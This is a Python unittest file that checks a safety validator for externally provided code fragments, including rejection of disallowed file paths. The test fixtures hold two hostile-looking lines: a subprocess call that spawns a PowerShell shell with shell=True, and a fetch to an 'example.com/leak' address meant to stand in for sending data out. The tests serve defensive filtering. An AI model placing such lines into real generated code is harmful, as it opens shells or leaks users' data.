from __future__ import annotations

import unittest

from tools.providers.live_provider_adapter import _normalize_fragments
from tools.providers.project_generation_provider_assisted import validate_provider_fragments


class LiveProviderSafetyTests(unittest.TestCase):
    def test_safety_filter_rejects_shell_and_network_tokens(self) -> None:
        validation = validate_provider_fragments(
            {
                "provider_live_helper.py": "import subprocess\nsubprocess.run(['pwsh'], shell=True)\n",
                "static/live_provider_enhancements.js": "fetch('https://example.com/leak')\n",
            }
        )
        self.assertFalse(validation["syntax_valid"])
        reasons = " ".join(row["reason"] for row in validation["rows"])
        self.assertIn("forbidden_token", reasons)

    def test_adapter_rejects_disallowed_paths(self) -> None:
        fragments, _sections, rejected = _normalize_fragments(
            "csv_expense_analyzer",
            {"fragments": [{"path": "expense_analyzer.py", "content": "def unsafe(): pass\n"}]},
        )
        self.assertEqual(fragments, {})
        self.assertTrue(any("disallowed_path" in item for item in rejected))


if __name__ == "__main__":
    unittest.main()
